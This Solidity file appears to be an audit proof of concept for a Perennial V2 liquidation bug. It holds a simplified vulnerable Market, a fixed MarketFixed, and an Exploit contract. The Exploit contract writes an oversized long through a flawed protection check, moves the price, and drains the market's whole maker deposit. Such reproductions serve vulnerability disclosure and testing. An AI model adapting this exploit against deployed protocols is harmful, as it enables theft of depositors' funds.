// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Perennial V2 — H-4 (Sherlock 2025-01, issue 32)
    _validateProtection treats pending.negative == latest magnitude as a full
    close and no longer rejects an order that increases size. A liquidator
    writes long = 2**62-1, a one-step price move marks that notional to the
    whole maker deposit, and settle pays it out.
*/

struct UFixed6 {
    uint256 v;
}

struct PendingLocal {
    UFixed6 negative;
}

struct PositionLocal {
    UFixed6 size;
}

struct Context {
    PendingLocal pendingLocal;
    PositionLocal latestPositionLocal;
}

library UFixed6Lib {
    function eq(UFixed6 memory a, UFixed6 memory b) internal pure returns (bool) {
        return a.v == b.v;
    }
}

library PendingLib {
    function neg(PendingLocal memory self) internal pure returns (UFixed6 memory) {
        return self.negative;
    }
}

library PositionLib {
    function magnitude(PositionLocal memory self) internal pure returns (UFixed6 memory) {
        return self.size;
    }
}

using UFixed6Lib for UFixed6 global;
using PendingLib for PendingLocal global;
using PositionLib for PositionLocal global;

contract Cash {
    string public symbol = "USD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Market {
    Cash public immutable cash;
    uint256 public price = 1e18;

    struct Local {
        uint256 latestMagnitude;
        uint256 pendingNegative;
        uint256 entryPrice;
        bool maintained;
    }

    mapping(address => Local) public locals;

    constructor(Cash _cash) {
        cash = _cash;
    }

    function seed(address account, uint256 magnitude, uint256 pendingNeg, uint256 entry, bool maintained) external {
        locals[account] = Local(magnitude, pendingNeg, entry, maintained);
    }

    function magnitudeOf(address account) external view returns (uint256) {
        return locals[account].latestMagnitude;
    }

    /// @dev Vulnerable protection check from InvariantLib._validateProtection.
    function _validateProtection(Context memory context) internal pure returns (bool) {
        if (!context.pendingLocal.neg().eq(context.latestPositionLocal.magnitude())) return false; // no pending zero-cross, liquidate with full close
        return true;
    }

    function liquidate(address account, uint256 newLong) external returns (bool) {
        Local storage L = locals[account];
        Context memory context = Context({
            pendingLocal: PendingLocal({negative: UFixed6(L.pendingNegative)}),
            latestPositionLocal: PositionLocal({size: UFixed6(L.latestMagnitude)})
        });
        if (!_validateProtection(context)) return false;
        if (L.maintained) return false;
        // @> VULN: pending.negative == latest magnitude passed the check, so the liquidation stores a larger long
        L.latestMagnitude = newLong;
        L.pendingNegative = 0;
        L.entryPrice = price;
        return true;
    }

    function commitPrice(uint256 newPrice) external {
        price = newPrice;
    }

    function settle(address account) external returns (uint256 pnl) {
        Local storage L = locals[account];
        if (L.latestMagnitude > 0 && price > L.entryPrice) {
            pnl = L.latestMagnitude * (price - L.entryPrice) / L.entryPrice;
        }
        uint256 pile = cash.balanceOf(address(this));
        if (pnl > pile) pnl = pile;
        L.latestMagnitude = 0;
        if (pnl > 0) {
            require(cash.transfer(account, pnl), "pay");
        }
    }
}

contract MarketFixed {
    Cash public immutable cash;
    uint256 public price = 1e18;

    struct Local {
        uint256 latestMagnitude;
        uint256 pendingNegative;
        uint256 entryPrice;
        bool maintained;
    }

    mapping(address => Local) public locals;

    constructor(Cash _cash) {
        cash = _cash;
    }

    function seed(address account, uint256 magnitude, uint256 pendingNeg, uint256 entry, bool maintained) external {
        locals[account] = Local(magnitude, pendingNeg, entry, maintained);
    }

    function magnitudeOf(address account) external view returns (uint256) {
        return locals[account].latestMagnitude;
    }

    function liquidate(address account, uint256 newLong) external returns (bool) {
        Local storage L = locals[account];
        if (L.pendingNegative != L.latestMagnitude) return false;
        if (L.maintained) return false;
        // FIX: a protected update may not increase the position.
        if (newLong > L.latestMagnitude) return false;
        L.latestMagnitude = newLong;
        L.pendingNegative = 0;
        L.entryPrice = price;
        return true;
    }
}

contract Exploit {
    uint256 public constant HUGE = uint256(2 ** 62 - 1);

    Cash public cash;
    Market public market;
    uint256 public paid;

    constructor() {
        cash = new Cash();
        market = new Market(cash);
        cash.mint(address(market), HUGE);
        market.seed(address(this), 10, 10, 1e18, false);
    }

    function run() external {
        bool opened = market.liquidate(address(this), HUGE);
        uint256 stored = market.magnitudeOf(address(this));
        market.commitPrice(2e18);
        paid = market.settle(address(this));
        require(opened, "rejected");
        require(stored == HUGE, "not huge");
        require(paid == HUGE, "not drained");
        require(cash.balanceOf(address(market)) == 0, "left");
        require(cash.balanceOf(address(this)) == HUGE, "received");
    }
}
